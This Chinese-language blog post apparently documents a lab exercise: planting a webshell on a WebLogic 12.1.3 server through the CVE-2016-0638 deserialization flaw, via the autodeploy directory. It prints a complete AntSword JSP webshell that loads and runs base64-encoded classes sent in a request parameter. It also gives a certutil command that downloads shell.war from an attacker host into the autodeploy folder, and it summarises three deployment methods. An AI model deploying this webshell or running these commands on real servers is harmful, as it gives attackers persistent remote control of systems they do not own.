---
title: Weblogic 写入webshell
date: 2025-10-08 16:56:47
permalink: /pages/weblogicshell/
categories:
  - 渗透
tags:
  - Weblogic
author: 
  name: the0n3
  link: https://the0n3.top
---

在打靶过程发现一台Windows Weblogic服务器，存在CVE-2016-0638 反序列化漏洞，可以任意命令执行，在想怎么写入webshell，webshell客户端连接方便利用

<!-- more -->

这篇文章只探究了autodeploy目录下的webshell写入，可能存在其他目录部署webshell，本文不做介绍

## 环境

WebLogic Server 版本: 12.1.3.0.0

jdk 版本：1.8.0_202

## RCE利用挖掘

通过weblogic综合利用工具直接在命令执行的工作目录`C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain`上传webshell，不会解析

![](/medias/weblogic-shell/1.png)

## autodeploy目录


拷打哈基米后发现，这个工作目录下的`autodeploy`目录可以自动部署war包，在这个目录上传war包可以解析jsp webshell

这个工具好像只能直接写入jsp内容，没有上传文件的功能

![](/medias/weblogic-shell/2.png)

### 创建目录

尝试命令执行先在`autodeploy`目录下创建一个目录，再把jsp webshell写入这个目录下，成功解析

```bash
mkdir autodeploy\hello
```

在绝对路径`C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\autodeploy\hello\hello.jsp`写入简单jsp

![](/medias/weblogic-shell/3.png)

成功解析jsp

![](/medias/weblogic-shell/4.png)

创建`autodeploy\shell`写入蚁剑webshell shell.jsp

```java
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```

![](/medias/weblogic-shell/5.png)

蚁剑连接

![](/medias/weblogic-shell/6.png)

![](/medias/weblogic-shell/7.png)

直接在`autodeploy`目录下创建jsp webshell不会解析，需要有一层文件夹

![](/medias/weblogic-shell/8.png)


### 上传war文件

在autodeploy目录下有readme.txt，介绍了`EAR`、`WAR`、`RAR`这些文件类型

![](/medias/weblogic-shell/9.png)

测试war格式1/1.jsp

![](/medias/weblogic-shell/10.png)

![](/medias/weblogic-shell/11.png)

![](/medias/weblogic-shell/12.png)


测试rar格式2/2.jsp，解析失败404

![](/medias/weblogic-shell/13.png)

拷打哈基米，weblogic允许的rar格式并不是常用的压缩rar格式，所以失败了

![](/medias/weblogic-shell/14.png)

### 远程下载war文件

既然这个工具可用任意命令执行，执行下载远程攻击机制作好的webshell war文件到指定的autodeploy目录下，也可以正常解析

```bash
certutil -urlcache -split -f http://192.168.20.10/shell.war C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\autodeploy\shell.war
```

## 总结

总结weblogic可用的写入webshell方式

- autodeploy/shell/shell.jsp
- autodeploy/shell.war
- 远程下载war文件到autodeploy目录下

参考：

- [记一次曲折的weblogic上传webshell](https://chaserw.github.io/2021/11/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84weblogic%E4%B8%8A%E4%BC%A0webshell/)